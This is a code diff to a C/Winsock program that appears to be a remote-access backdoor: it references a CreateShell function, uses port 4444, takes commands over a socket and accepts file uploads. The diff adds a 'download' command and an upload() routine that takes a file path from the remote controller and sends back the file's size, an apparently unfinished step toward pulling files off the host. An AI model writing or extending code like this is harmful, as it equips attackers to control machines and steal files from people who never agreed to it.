@@ -12,6 +12,8 @@ void CreateShell(int port);
 int startup();
 void recieve();
 void auth();
+int findSize(char file_name[]);
+void upload();
 int port = 4444;
 SOCKET sockt; //global sockt
 int main() {
@@ -37,6 +39,9 @@ int main() {
 				}
 				else if (strcmp(RecvData, "send\n") == 0) {// starts send process
 					recieve();
+				}
+				else if (strcmp(RecvData, "download\n") == 0) {
+					upload();
 				}
 
 			}
@@ -137,11 +142,37 @@ void recieve() {
 	fclose(ptr); //close file
 	auth();
 }
-void send() {
+void upload() {
 	char file_path[DEFAULT_BUFLEN] = { '\0' }; // ititialize to all zeros
+	recv(sockt, file_path, DEFAULT_BUFLEN, 0);
+	auth();
+
+	int size = findSize(file_path); //get filesize
+
+	if (size != -1) {
+		char sizechar[8] = { '\0' };
+		sprintf(sizechar, "%d", size);
+		send(sockt, sizechar, sizeof(sizechar), 0); //send file size
+
+	}
 
 }
 void auth() {
 	char response = 'K';
 	send(sockt, &response, 1, 0);
+}
+int findSize(char file_name[]) {
+	FILE* fp = fopen(file_name, "r");
+	
+	if (fp == NULL) {
+		printf("file not found");
+		return -1;
+	}
+	fseek(fp, 0L, SEEK_END); //moves to end of file
+
+	long int size = ftell(fp);
+
+	fclose(fp);
+
+	return size;
 }
